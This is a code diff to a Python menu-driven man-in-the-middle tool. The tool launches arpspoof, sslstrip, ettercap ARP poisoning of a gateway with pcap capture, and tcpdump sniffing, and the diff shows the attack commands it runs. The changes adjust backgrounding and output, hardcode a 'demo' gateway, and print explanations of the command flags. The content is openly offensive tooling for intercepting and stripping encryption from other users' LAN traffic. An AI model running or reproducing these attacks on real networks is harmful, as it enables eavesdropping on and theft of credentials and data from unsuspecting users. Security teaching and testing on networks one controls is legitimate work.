@@ -82,7 +82,7 @@ ___________                                                __
             while True:
                 mimopt = raw_input('1) ipv4 ip forward (Step 1)\n'
                                    '2) Configure iptables\n'
-                                   '3) arpspoof start (fix output)\n'
+                                   '3) arpspoof start\n'
                                    '4) arpspoof stop\n'
                                    '5) sslstrip start\n'
                                    '6) sslstrip off\n'
@@ -1075,9 +1075,11 @@ def mim_arpspoof():
         arpopt_arr = arpopt.split(' ')
         print 'arpspoof is now running...'
         try:
-            cmd = 'arpspoof -i ' + str(arpopt_arr[0]) + ' -t ' + str(arpopt_arr[1]) + ' ' + str(arpopt_arr[2])
+            cmd = 'arpspoof -i ' + str(arpopt_arr[0]) + ' -t ' + str(arpopt_arr[1]) + ' ' + str(arpopt_arr[2] + ' &')
             print str(cmd)
-            os.system('arpspoof -i ' + str(arpopt_arr[0]) + ' -t ' + str(arpopt_arr[1]) + ' ' + str(arpopt_arr[2]) + ' >/dev/null 2>&1 &')
+            #work on output
+            #os.system('arpspoof -i ' + str(arpopt_arr[0]) + ' -t ' + str(arpopt_arr[1]) + ' ' + str(arpopt_arr[2]) + ' >/dev/null 2>&1 &')
+            os.system(cmd)
             break
         except IndexError:
             print '\033[1;31mOops! Invalid Input\033[1;m'
@@ -1101,15 +1103,17 @@ def mim_sslstrip():
         print '\033[1;31mport used should be same as iptables port\033[1;m\n'
         portopt = raw_input('Default port 777. (Press Enter for default)\n'
                             '\033[1;32mlisten port >>\033[1;m')
-        if portopt == ' ':
-            os.system('sslstrip -l 777 >/dev/null 2>&1 &')
+        if portopt == '':
+            #os.system('sslstrip -l 777 >/dev/null 2>&1 &')
             print 'Launching sslstrip...'
+            os.system('sslstrip -l 777 &')
             break
         elif portopt == 'back':
             break
         else:
             print 'Listening on port ' + str(portopt) + '...'
-            os.system('sslstrip -l ' + str(portopt) + ' >/dev/null 2>&1 &')
+            #os.system('sslstrip -l ' + str(portopt) + ' >/dev/null 2>&1 &')
+            os.system('sslstrip -l ' + str(portopt) + ' &')
 
 
 def mim_ettercap():
@@ -1121,9 +1125,20 @@ def mim_ettercap():
                             '3) Stop Ettercap\n'
                             '\033[1;32mYour Selection >>\033[1;m')
         if ett_opt == '1':
+            print '\033[1;31mRunning the following command: \033[1;m'
+            print 'ettercap -T -q -M ARP /192.168.1.1/// -w /root/demo.pcap >/dev/null 2>&1 &\n'
+            print '-T (text only GUI)'
+            print '-q (quiet mode - packet verbosity off)'
+            print '-M (method)'
+            print '/// (collect entire IP range)'
+            print '-w (write to pcap file)\n'
             print 'Poisoning Gateway...'
-            os.system('ettercap -T -q -M ARP /{0}/// -w {1}/{2}.pcap >/dev/null 2>&1 &'
-                      .format(get_local_gateway(), expanduser('~'), ptime.strftime("%s")))
+            os.system('ettercap -T -q -M ARP /192.168.1.1/// -w /root/demo.pcap >/dev/null 2>&1 &')
+            #below requires fixing - hardcoding presumptive gateway for demo
+            #os.system('ettercap -T -q -M ARP /{0}/// -w {1}/{2}.pcap >/dev/null 2>&1 &'
+             #         .format(get_local_gateway(), expanduser('~'), ptime.strftime("%s")))
+            #os.system('ettercap -T -q -M arp:remote /' + get_local_gateway() + '/// -w ' + expanduser('~') + '/' + ptime.strftime("%s") + '.pcap >/dev/null 2>&1 &')
+
         elif ett_opt == '2':
             while True:
                 ett_ip = raw_input('\033[1;32mEnter the IP:\033[1;m')
@@ -1150,10 +1165,17 @@ def mim_tcpdump():
         if tcp_face == 'back':
             break
         else:
-            print 'dumping...\n'
+            cmd = 'tcpdump -ni {0} -w {1}/{2}.pcap >/dev/null 2>&1 &'.format(tcp_face, expanduser('~'), t.strftime("%s"))
+            print '\033[1;31mRunning the following command: \033[1;m'
+            print cmd
+            print '-i (interface)'
+            print "-n (don't convert addresses to names)"
+            print '-w (write pcap file)'
+            print 'sniffing...\n'
             print 'This will create a pcap file in your home dir.'
-            os.system('tcpdump -ni {0} -w {1}/{2}.pcap >/dev/null 2>&1 &'
-                      .format(tcp_face, expanduser('~'), t.strftime("%s")))
+            os.system(cmd)
+            #os.system('tcpdump -ni {0} -w {1}/{2}.pcap >/dev/null 2>&1 &'
+            #          .format(tcp_face, expanduser('~'), t.strftime("%s")))
 
 
 if __name__ == "__main__":
